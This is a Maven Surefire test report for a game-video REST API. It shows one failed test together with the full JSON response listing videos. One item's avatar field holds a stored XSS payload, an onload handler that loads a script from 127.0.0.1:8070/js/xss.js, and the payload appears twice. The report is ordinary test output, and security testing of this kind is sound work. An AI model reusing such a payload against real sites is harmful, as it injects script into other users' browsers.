<?xml version="1.0" encoding="UTF-8"?>
<testsuite xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://maven.apache.org/surefire/maven-surefire-plugin/xsd/surefire-test-report.xsd" name="TestSuite" time="8.359" tests="3" errors="0" skipped="0" failures="1">
  <properties>
[...]
</properties>
  <testcase name="testLogin" classname="com.emma.app.my_rest_test.LoginTest" time="3.145"/>
  <testcase name="testGameVideoList" classname="com.emma.app.my_rest_test.VideoListTest" time="0.483">
    <failure message="1 expectation failed.&#10;Response body doesn&apos;t match expectation.&#10;Expected: a string containing &quot;12658&quot;&#10;  Actual: {&quot;code&quot;:0,&quot;message&quot;:&quot;&quot;,&quot;data&quot;:{&quot;count&quot;:1719,&quot;items&quot;:[{&quot;type&quot;:3,&quot;name&quot;:&quot;213123&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/151/1446688225315.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1532&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:55&quot;,&quot;playCount&quot;:1000095,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1446688232000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:0}},{&quot;type&quot;:3,&quot;name&quot;:&quot;wwww1111111&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/151/1446689941002.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1534&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:55&quot;,&quot;playCount&quot;:100006,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1446689950000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:0}},{&quot;type&quot;:3,&quot;name&quot;:&quot;烟欲：CF手游原创三指切枪流玩法嗨爆战场&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/200212/1442994603489_crop.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;47&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;06:43&quot;,&quot;playCount&quot;:84953,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1442994844000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:207}},{&quot;type&quot;:3,&quot;name&quot;:&quot;天痕解说：穿越火线手游版震撼试玩！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/200215/1442939908311.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;27&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;07:21&quot;,&quot;playCount&quot;:39332,&quot;creator&quot;:&quot;485&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;giftCount&quot;:1,&quot;createdTime&quot;:1442939955000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\&quot; onload=\&quot;with(document)body.appendChild(createElement(&apos;script&apos;)).src=&apos;http://127.0.0.1:8070/js/xss.js&apos;\&quot;&quot;,&quot;commentCount&quot;:140}},{&quot;type&quot;:3,&quot;name&quot;:&quot;惊险闪避-尽显身法艺术&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/267548/1443108206868.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;94&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;06:05&quot;,&quot;playCount&quot;:31521,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443108315000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:124}},{&quot;type&quot;:3,&quot;name&quot;:&quot;鸡爷：挑战卡机枪BUG教程！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/204467/1443698518399.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;256&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;02:41&quot;,&quot;playCount&quot;:18851,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:420,&quot;createdTime&quot;:1443698382000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:71}},{&quot;type&quot;:3,&quot;name&quot;:&quot;汤圆第一次制作视频，大家多多包含，多多支持，么么哒，多多送浪花&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/207699/1443102376020.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;92&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;05:04&quot;,&quot;playCount&quot;:14088,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443102441000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:90}},{&quot;type&quot;:3,&quot;name&quot;:&quot;鸡爷：夜幕山庄卡汽车BUG！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/204467/1443801232056.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;294&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;01:44&quot;,&quot;playCount&quot;:13239,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443801107000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:23}},{&quot;type&quot;:3,&quot;name&quot;:&quot;123123&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/151/1446712843262.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1580&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:55&quot;,&quot;playCount&quot;:12300,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1446712844000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:0}},{&quot;type&quot;:3,&quot;name&quot;:&quot;触手 第一美腿  花式吊打小学生 秀爆全场.&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/230834/1444238823056_crop.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;435&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;12:36&quot;,&quot;playCount&quot;:10112,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1444238856000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:154}},{&quot;type&quot;:3,&quot;name&quot;:&quot;524364&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/151/1446713317456.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1581&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:55&quot;,&quot;playCount&quot;:10013,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1446713318000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:0}},{&quot;type&quot;:3,&quot;name&quot;:&quot;34234&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/151/1446708039655.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1570&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:55&quot;,&quot;playCount&quot;:10007,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1446708046000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:1}},{&quot;type&quot;:3,&quot;name&quot;:&quot;wert234234&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/151/1446702932454.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1553&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:55&quot;,&quot;playCount&quot;:10007,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1446702934000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:0}},{&quot;type&quot;:3,&quot;name&quot;:&quot;djebd&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/174/1445308833499.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;1003&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;03:40&quot;,&quot;playCount&quot;:8898,&quot;creator&quot;:&quot;dfty&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1445308849000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/uiupload/default/default-1.png&quot;,&quot;commentCount&quot;:0}},{&quot;type&quot;:3,&quot;name&quot;:&quot;易小九：困难模式泰坦通关解说！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/249060/1443704141195.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;273&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;16:47&quot;,&quot;playCount&quot;:8799,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443746403000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:26}},{&quot;type&quot;:3,&quot;name&quot;:&quot;1&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/251634/1443532608738.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;190&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;03:10&quot;,&quot;playCount&quot;:6939,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443532611000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:18}},{&quot;type&quot;:3,&quot;name&quot;:&quot;你能不能装？&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/224021/1443535394468.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;195&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;10:23&quot;,&quot;playCount&quot;:6798,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443535397000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:13}},{&quot;type&quot;:3,&quot;name&quot;:&quot;以前打嗯  不是手柄&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/337887/1444322976563.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;471&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;07:19&quot;,&quot;playCount&quot;:6761,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1444322977000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:2}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小刘乱扯18：想打我？你知道我爸爸是谁吗？&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/209781/1443859796509.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;310&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;07:47&quot;,&quot;playCount&quot;:6177,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443871588000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:23}},{&quot;type&quot;:3,&quot;name&quot;:&quot;看了就知道&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/229191/1443532433017.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;189&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;03:10&quot;,&quot;playCount&quot;:5737,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:3500,&quot;createdTime&quot;:1443532483000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:14}}],&quot;breakpoint&quot;:&quot;189-5737&quot;}}&#10;" type="java.lang.AssertionError">java.lang.AssertionError: 
1 expectation failed.
Response body doesn't match expectation.
Expected: a string containing "12658"
  Actual: {"code":0,"message":"","data":{"count":1719,"items":[{"type":3,"name":"213123","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446688225315.jpg!jellyfishnavstyle1","targetKey":"1532","meta":{"duration":"00:55","playCount":1000095,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446688232000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"wwww1111111","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446689941002.jpg!jellyfishnavstyle1","targetKey":"1534","meta":{"duration":"00:55","playCount":100006,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446689950000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"烟欲：CF手游原创三指切枪流玩法嗨爆战场","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/200212/1442994603489_crop.jpg!jellyfishnavstyle1","targetKey":"47","meta":{"duration":"06:43","playCount":84953,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1442994844000,"avatar":"","commentCount":207}},{"type":3,"name":"天痕解说：穿越火线手游版震撼试玩！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/200215/1442939908311.jpg!jellyfishnavstyle1","targetKey":"27","meta":{"duration":"07:21","playCount":39332,"creator":"485","gender":"female","giftCount":1,"createdTime":1442939955000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":140}},{"type":3,"name":"惊险闪避-尽显身法艺术","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/267548/1443108206868.jpg!jellyfishnavstyle1","targetKey":"94","meta":{"duration":"06:05","playCount":31521,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443108315000,"avatar":"","commentCount":124}},{"type":3,"name":"鸡爷：挑战卡机枪BUG教程！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/204467/1443698518399.jpg!jellyfishnavstyle1","targetKey":"256","meta":{"duration":"02:41","playCount":18851,"creator":"用户不存在","gender":"unknow","giftCount":420,"createdTime":1443698382000,"avatar":"","commentCount":71}},{"type":3,"name":"汤圆第一次制作视频，大家多多包含，多多支持，么么哒，多多送浪花","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/207699/1443102376020.jpg!jellyfishnavstyle1","targetKey":"92","meta":{"duration":"05:04","playCount":14088,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443102441000,"avatar":"","commentCount":90}},{"type":3,"name":"鸡爷：夜幕山庄卡汽车BUG！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/204467/1443801232056.jpg!jellyfishnavstyle1","targetKey":"294","meta":{"duration":"01:44","playCount":13239,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443801107000,"avatar":"","commentCount":23}},{"type":3,"name":"123123","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446712843262.jpg!jellyfishnavstyle1","targetKey":"1580","meta":{"duration":"00:55","playCount":12300,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446712844000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"触手 第一美腿  花式吊打小学生 秀爆全场.","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/230834/1444238823056_crop.jpg!jellyfishnavstyle1","targetKey":"435","meta":{"duration":"12:36","playCount":10112,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1444238856000,"avatar":"","commentCount":154}},{"type":3,"name":"524364","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446713317456.jpg!jellyfishnavstyle1","targetKey":"1581","meta":{"duration":"00:55","playCount":10013,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446713318000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"34234","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446708039655.jpg!jellyfishnavstyle1","targetKey":"1570","meta":{"duration":"00:55","playCount":10007,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446708046000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":1}},{"type":3,"name":"wert234234","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446702932454.jpg!jellyfishnavstyle1","targetKey":"1553","meta":{"duration":"00:55","playCount":10007,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446702934000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"djebd","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/174/1445308833499.jpg!jellyfishnavstyle1","targetKey":"1003","meta":{"duration":"03:40","playCount":8898,"creator":"dfty","gender":"male","giftCount":0,"createdTime":1445308849000,"avatar":"http://kascdn.kascend.com/jellyfish/uiupload/default/default-1.png","commentCount":0}},{"type":3,"name":"易小九：困难模式泰坦通关解说！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/249060/1443704141195.jpg!jellyfishnavstyle1","targetKey":"273","meta":{"duration":"16:47","playCount":8799,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443746403000,"avatar":"","commentCount":26}},{"type":3,"name":"1","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/251634/1443532608738.jpg!jellyfishnavstyle1","targetKey":"190","meta":{"duration":"03:10","playCount":6939,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443532611000,"avatar":"","commentCount":18}},{"type":3,"name":"你能不能装？","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/224021/1443535394468.jpg!jellyfishnavstyle1","targetKey":"195","meta":{"duration":"10:23","playCount":6798,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443535397000,"avatar":"","commentCount":13}},{"type":3,"name":"以前打嗯  不是手柄","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/337887/1444322976563.jpg!jellyfishnavstyle1","targetKey":"471","meta":{"duration":"07:19","playCount":6761,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1444322977000,"avatar":"","commentCount":2}},{"type":3,"name":"小刘乱扯18：想打我？你知道我爸爸是谁吗？","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/209781/1443859796509.jpg!jellyfishnavstyle1","targetKey":"310","meta":{"duration":"07:47","playCount":6177,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443871588000,"avatar":"","commentCount":23}},{"type":3,"name":"看了就知道","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/229191/1443532433017.jpg!jellyfishnavstyle1","targetKey":"189","meta":{"duration":"03:10","playCount":5737,"creator":"用户不存在","gender":"unknow","giftCount":3500,"createdTime":1443532483000,"avatar":"","commentCount":14}}],"breakpoint":"189-5737"}}

	at com.emma.app.my_rest_test.VideoListTest.testGameVideoList(VideoListTest.java:62)
</failure>
    <system-out><![CDATA[_sign_online65ef3f8cdab17a4bf7986e321b791e67
HTTP/1.1 200 OK
Server: nginx/1.9.0
Date: Fri, 09 Sep 2016 07:45:09 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 7534
Connection: keep-alive
Set-Cookie: _i7=5b961db1d2f9459a869aaa59b8845cf6; Expires=Mon, 15-Apr-2019 07:45:09 GMT; Path=/; HttpOnly

{"code":0,"message":"","data":{"count":1719,"items":[{"type":3,"name":"213123","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446688225315.jpg!jellyfishnavstyle1","targetKey":"1532","meta":{"duration":"00:55","playCount":1000095,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446688232000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"wwww1111111","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446689941002.jpg!jellyfishnavstyle1","targetKey":"1534","meta":{"duration":"00:55","playCount":100006,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446689950000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"烟欲：CF手游原创三指切枪流玩法嗨爆战场","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/200212/1442994603489_crop.jpg!jellyfishnavstyle1","targetKey":"47","meta":{"duration":"06:43","playCount":84953,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1442994844000,"avatar":"","commentCount":207}},{"type":3,"name":"天痕解说：穿越火线手游版震撼试玩！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/200215/1442939908311.jpg!jellyfishnavstyle1","targetKey":"27","meta":{"duration":"07:21","playCount":39332,"creator":"485","gender":"female","giftCount":1,"createdTime":1442939955000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":140}},{"type":3,"name":"惊险闪避-尽显身法艺术","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/267548/1443108206868.jpg!jellyfishnavstyle1","targetKey":"94","meta":{"duration":"06:05","playCount":31521,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443108315000,"avatar":"","commentCount":124}},{"type":3,"name":"鸡爷：挑战卡机枪BUG教程！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/204467/1443698518399.jpg!jellyfishnavstyle1","targetKey":"256","meta":{"duration":"02:41","playCount":18851,"creator":"用户不存在","gender":"unknow","giftCount":420,"createdTime":1443698382000,"avatar":"","commentCount":71}},{"type":3,"name":"汤圆第一次制作视频，大家多多包含，多多支持，么么哒，多多送浪花","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/207699/1443102376020.jpg!jellyfishnavstyle1","targetKey":"92","meta":{"duration":"05:04","playCount":14088,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443102441000,"avatar":"","commentCount":90}},{"type":3,"name":"鸡爷：夜幕山庄卡汽车BUG！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/204467/1443801232056.jpg!jellyfishnavstyle1","targetKey":"294","meta":{"duration":"01:44","playCount":13239,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443801107000,"avatar":"","commentCount":23}},{"type":3,"name":"123123","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446712843262.jpg!jellyfishnavstyle1","targetKey":"1580","meta":{"duration":"00:55","playCount":12300,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446712844000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"触手 第一美腿  花式吊打小学生 秀爆全场.","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/230834/1444238823056_crop.jpg!jellyfishnavstyle1","targetKey":"435","meta":{"duration":"12:36","playCount":10112,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1444238856000,"avatar":"","commentCount":154}},{"type":3,"name":"524364","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446713317456.jpg!jellyfishnavstyle1","targetKey":"1581","meta":{"duration":"00:55","playCount":10013,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446713318000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"34234","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446708039655.jpg!jellyfishnavstyle1","targetKey":"1570","meta":{"duration":"00:55","playCount":10007,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446708046000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":1}},{"type":3,"name":"wert234234","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/151/1446702932454.jpg!jellyfishnavstyle1","targetKey":"1553","meta":{"duration":"00:55","playCount":10007,"creator":"ppppppppppp","gender":"male","giftCount":0,"createdTime":1446702934000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":0}},{"type":3,"name":"djebd","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/174/1445308833499.jpg!jellyfishnavstyle1","targetKey":"1003","meta":{"duration":"03:40","playCount":8898,"creator":"dfty","gender":"male","giftCount":0,"createdTime":1445308849000,"avatar":"http://kascdn.kascend.com/jellyfish/uiupload/default/default-1.png","commentCount":0}},{"type":3,"name":"易小九：困难模式泰坦通关解说！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/249060/1443704141195.jpg!jellyfishnavstyle1","targetKey":"273","meta":{"duration":"16:47","playCount":8799,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443746403000,"avatar":"","commentCount":26}},{"type":3,"name":"1","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/251634/1443532608738.jpg!jellyfishnavstyle1","targetKey":"190","meta":{"duration":"03:10","playCount":6939,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443532611000,"avatar":"","commentCount":18}},{"type":3,"name":"你能不能装？","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/224021/1443535394468.jpg!jellyfishnavstyle1","targetKey":"195","meta":{"duration":"10:23","playCount":6798,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443535397000,"avatar":"","commentCount":13}},{"type":3,"name":"以前打嗯  不是手柄","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/337887/1444322976563.jpg!jellyfishnavstyle1","targetKey":"471","meta":{"duration":"07:19","playCount":6761,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1444322977000,"avatar":"","commentCount":2}},{"type":3,"name":"小刘乱扯18：想打我？你知道我爸爸是谁吗？","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/209781/1443859796509.jpg!jellyfishnavstyle1","targetKey":"310","meta":{"duration":"07:47","playCount":6177,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443871588000,"avatar":"","commentCount":23}},{"type":3,"name":"看了就知道","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/229191/1443532433017.jpg!jellyfishnavstyle1","targetKey":"189","meta":{"duration":"03:10","playCount":5737,"creator":"用户不存在","gender":"unknow","giftCount":3500,"createdTime":1443532483000,"avatar":"","commentCount":14}}],"breakpoint":"189-5737"}}
]]></system-out>
  </testcase>
  <testcase name="testOnlineVideoList" classname="com.emma.app.my_rest_test.VideoListTest" time="4.221"/>
</testsuite>